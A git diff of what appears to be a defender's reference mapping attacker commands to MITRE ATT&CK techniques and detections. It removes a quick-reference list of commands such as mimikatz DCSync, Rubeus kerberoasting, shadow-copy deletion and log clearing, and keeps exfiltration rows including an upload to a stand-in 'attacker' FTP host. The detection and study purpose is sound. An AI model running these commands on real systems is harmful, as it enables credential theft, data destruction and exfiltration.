@@ -15,8 +15,6 @@ A complete, kill-chain-ordered reference of attacker commands mapped to MITRE AT
 8. [PowerShell Deep Dive](#8-powershell-deep-dive)
 9. [Active Directory Deep Dive](#9-active-directory-deep-dive)
 10. [Collection & Exfiltration](#10-collection--exfiltration)
-11. [Quick-Reference Lists](#11-quick-reference-lists)
-12. [30-Day Study Plan](#12-30-day-study-plan)
 
 ---
 
@@ -202,21 +200,5 @@ A complete, kill-chain-ordered reference of attacker commands mapped to MITRE AT
 | 8 | `curl -T out.zip ftp://attacker/` | Uploads over an unencrypted protocol | Simple, low-effort exfil | [T1048.003](https://attack.mitre.org/techniques/T1048/003/) | Exfil Over Unencrypted Non-C2 Protocol | Sysmon Event ID 3, unencrypted traffic |
 | 9 | DNS tunneling (`dnscat2`, `iodine`) | Smuggles data inside DNS queries | Evades HTTP/HTTPS-only monitoring | [T1048.003](https://attack.mitre.org/techniques/T1048/003/) | Exfil Over Unencrypted Non-C2 Protocol | High-volume/high-entropy DNS TXT queries |
 | 10 | Split archive into chunks (`7z a -v50m`) | Breaks one file into smaller pieces | Stays under DLP size thresholds | [T1030](https://attack.mitre.org/techniques/T1030/) | Data Transfer Size Limits | Multiple sequential archive parts created |
-
----
-
-## 11. Quick-Reference Lists
-
-**Top 10 common commands**
-`whoami` · `net user /domain` · `vssadmin delete shadows` · `rundll32.exe comsvcs.dll,MiniDump` · `mimikatz lsadump::dcsync` · `wevtutil cl Security` · `powershell -enc` · `net use \\target\c$` · `wmic process call create` · `Rubeus.exe kerberoast`
-
-**Top 5 for Active Directory-focused roles:**
-`mimikatz lsadump::dcsync` (T1003.006) · `Rubeus.exe kerberoast` (T1558.003) · `mimikatz kerberos::golden` (T1558.001) · `Get-DomainTrust` (T1482) · `net group "domain admins" /domain` (T1069.002)
-
-**Top 5 PowerShell patterns to instantly recognize:**
-`-enc` / `-EncodedCommand` · `IEX` + `DownloadString` · `-WindowStyle Hidden` · `Set-ExecutionPolicy Bypass` · reflective `[Reflection.Assembly]::Load`
-
-**The 3 highest-value "last chance" detections (worth automated response, not just alerting):**
-`vssadmin delete shadows` (T1490) · DCSync from a non-DC account (T1003.006) · a sudden local data-staging burst (T1074.001)
 
 ---
